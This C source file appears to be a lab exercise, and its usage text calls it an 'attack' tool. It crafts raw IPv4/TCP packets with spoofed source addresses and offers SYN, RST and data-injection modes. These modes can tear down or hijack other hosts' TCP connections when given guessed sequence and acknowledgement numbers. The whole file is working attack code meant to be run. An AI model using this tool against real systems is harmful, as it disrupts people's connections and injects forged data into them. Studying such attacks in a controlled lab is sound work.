#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <stdint.h>

// IP checksum
unsigned short csum_ip(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
    return ~sum;
}

// TCP checksum (prof version)
unsigned short csum_tcp(unsigned short *buf, int nwords) {
    unsigned long sum = 0;

    sum += buf[6];
    sum += buf[7];
    sum += buf[8];
    sum += buf[9];

    sum += htons(6);
    sum += htons(20 + (nwords << 1));

    for (int i = 10; i < 20 + nwords; i++)
        sum += buf[i];

    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
    return ~sum;
}

int main(int argc, char *argv[]) {

    if (argc < 8) {
        printf("Usage:\n");
        printf("  SYN attack : sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
        printf("  RST attack : sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
        printf("  DATA attack: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char mode = argv[1][0];
    char *src_ip = argv[2];
    int src_port = atoi(argv[3]);
    char *dst_ip = argv[4];
    int dst_port = atoi(argv[5]);
    uint32_t seq = strtoul(argv[6], NULL, 10);
    uint32_t ack = strtoul(argv[7], NULL, 10);

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    int payload_len = 0;
    if (mode == 'D') {
        strcpy(data, argv[8]);
        payload_len = strlen(argv[8]);
    }

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);
    iph->check = 0;

    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5;
    tcph->window = htons(65535);

    tcph->syn = tcph->ack = tcph->psh = tcph->rst = tcph->fin = tcph->urg = 0;

    if (mode == 'S') tcph->syn = 1;
    if (mode == 'R') { tcph->rst = 1; tcph->ack = 1; }
    if (mode == 'D') { tcph->psh = 1; tcph->ack = 1; }

    iph->check = csum_ip((unsigned short*)packet, 10);

    int nwords = (payload_len + 1) / 2;
    tcph->check = 0;
    tcph->check = csum_tcp((unsigned short*)packet, nwords);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = iph->daddr;

    sendto(s, packet, sizeof(struct iphdr)+sizeof(struct tcphdr)+payload_len,
           0, (struct sockaddr*)&sin, sizeof(sin));

    printf("Attack %c sent.\n", mode);
    return 0;
}
